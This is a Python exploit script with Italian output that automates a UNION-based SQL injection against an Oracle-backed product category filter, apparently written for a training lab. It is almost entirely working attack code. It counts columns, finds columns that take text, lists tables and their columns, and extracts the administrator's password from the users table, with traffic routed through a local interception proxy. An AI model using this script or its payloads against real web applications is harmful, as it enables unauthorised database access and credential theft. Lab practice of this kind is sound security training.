import requests
import re
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http:/127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

uri = "/filter?category=Pets"


def perform_request(url,uri,sql_payload):
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response = r.text
    return response


def exploit_sqli_number_columns(url,uri):
    for i in range(1,50):
        sql_payload = "' ORDER BY %i--" % i
        response = perform_request(url,uri,sql_payload)
        if "Internal Server Error" in response:
            print("[-] SQL Payload: %s\t| ERRORE" % sql_payload)
            return i - 1
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
    return False


def exploit_sqli_text_columns(url,uri,exploit_sqli_number_columns):
    counter = 0
    string = "'TESTTEXT'"
    null_list = ['NULL'] * exploit_sqli_number_columns
    for i in range(1,exploit_sqli_number_columns+1):
        null_list[i-1] = string
        sql_payload = "' UNION SELECT " + ",".join(null_list) + " FROM dual--"
        response = perform_request(url,uri,sql_payload)
        if string.strip('\'') not in response:
            print("[+] SQL Payload: %s\t| ERRORE" % sql_payload)
  
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
        counter += 1
    return counter


def exploit_sqli_table_name(url,uri):
    sql_payload = "' UNION SELECT table_name,NULL FROM all_tables--"
    response = perform_request(url,uri,sql_payload)
    soup = BeautifulSoup(response, "html.parser")
    table_name = soup.find(string=re.compile(r'USERS_[A-Z]{6}'))
    if not table_name:
        print("[-] SQL Payload: %s\t| ERRORE")
        print("[-] Impossibile recuperare il nome della tabella")
        return False
    print("[+] SQL Payload: %s\t| OK" % sql_payload )
    return table_name


def exploit_sqli_column_name(url,uri,table_name):
    sql_payload = "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '%s'--" % table_name
    response = perform_request(url,uri,sql_payload)
    soup = BeautifulSoup(response, "html.parser")
    username_column = soup.find(string=re.compile(r'USERNAME_\w+'))
    password_column = soup.find(string=re.compile(r'PASSWORD_\w+'))
    if username_column and password_column:
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
        return username_column,password_column
    print("[-] SQL Payload: %s\t| ERRORE" % sql_payload)
    print("[-] Impossibile recuperare colonne USERNAME e/o PASSWORD")
    return False


def exploit_sqli_adminpsw(url,uri,table_name,username_column,password_column):
    sql_payload = "' UNION SELECT {0},{1} FROM {2}--".format(username_column,password_column,table_name)
    response = perform_request(url,uri,sql_payload)
    soup = BeautifulSoup(response, "html.parser")
    adminpsw = soup.find(string=re.compile(r'administrator')).parent.findNext("td").contents[0]
    if adminpsw:
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
        return adminpsw
    print("[-] SQL Payload: %s\t| ERRORE" % sql_payload)
    print("[-] Impossibile recuperare la password di administrator")
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    
print("[+] Analizzando il database...\n")

print("[+] Calcoliamo il numero di colonne disponibili...")
number_of_columns = exploit_sqli_number_columns(url,uri)
print("[+] Numero di colonne disponibili: %s\n" % number_of_columns)

print("[+] Verifichiamo quante di queste colonne supportano il campo testo...")
text_columns = exploit_sqli_text_columns(url,uri,number_of_columns)
print("[+] Verificando quante colonne supportano il campo testo: %s\n" % text_columns)

print("[+] Alla ricerca di un nome di tabella che possa contenere informazioni utili...")
table_name = exploit_sqli_table_name(url,uri)
if table_name:
    print("[+] La tabella %s potrebbe contenere informazioni interessanti\n" % table_name)

print("[+] Analizziamone le colonne...")
username_column, password_column = exploit_sqli_column_name(url,uri,table_name)
if username_column and password_column:
    print("[+] Colonne interessanti individuate: {0} e {1}\n".format(username_column, password_column))

print("[+] Tentiamo di estrarre la password dell'utente administrator...")
adminpsw = exploit_sqli_adminpsw(url,uri,table_name,username_column,password_column)
if adminpsw:
    print("[+] La password di administrator è: %s" % adminpsw)